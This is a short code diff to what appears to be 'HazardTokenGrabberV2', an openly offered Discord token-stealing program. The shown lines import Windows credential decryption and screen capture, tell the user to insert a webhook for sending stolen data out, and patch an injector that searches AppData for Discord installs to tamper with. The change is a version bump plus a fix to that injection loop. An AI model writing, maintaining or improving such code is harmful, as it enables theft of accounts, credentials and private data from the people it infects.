@@ -23,7 +23,7 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.8.7'
+__version__ = '1.8.8'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -258,7 +258,7 @@ class HazardTokenGrabberV2(Functions):
     async def injector(self):
         # TO DO: reduce cognetive complexity
         for _dir in os.listdir(self.appdata):
-            if 'discord' in _dir.lower():
+            if 'discord' in _dir.lower() and ntpath.isdir(_dir):
                 discord = self.appdata + os.sep + _dir
                 for __dir in os.listdir(ntpath.abspath(discord)):
                     if re.match(r'app-(\d*\.\d*)*', __dir):
